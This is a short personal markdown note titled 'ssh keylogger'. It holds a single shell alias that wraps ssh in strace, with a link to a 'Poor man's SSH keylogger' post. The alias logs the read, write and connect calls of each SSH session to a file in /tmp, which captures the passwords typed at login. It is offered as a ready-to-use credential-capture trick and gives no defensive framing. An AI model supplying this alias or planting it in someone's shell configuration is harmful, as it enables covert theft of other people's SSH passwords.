---
tags: [ssh]
title: ssh keylogger
created: '2019-07-30T06:19:49.241Z'
modified: '2019-08-02T07:37:52.092Z'
---

# ssh keylogger

```sh
ssh='strace -o /tmp/sshpwd-$(date '+%d%h%m%s').log -e read,write,connect -s2048 ssh'
```

[Poor man's SSH keylogger](https://diogomonica.com/2011/02/03/poor-mans-ssh-keylogger/)
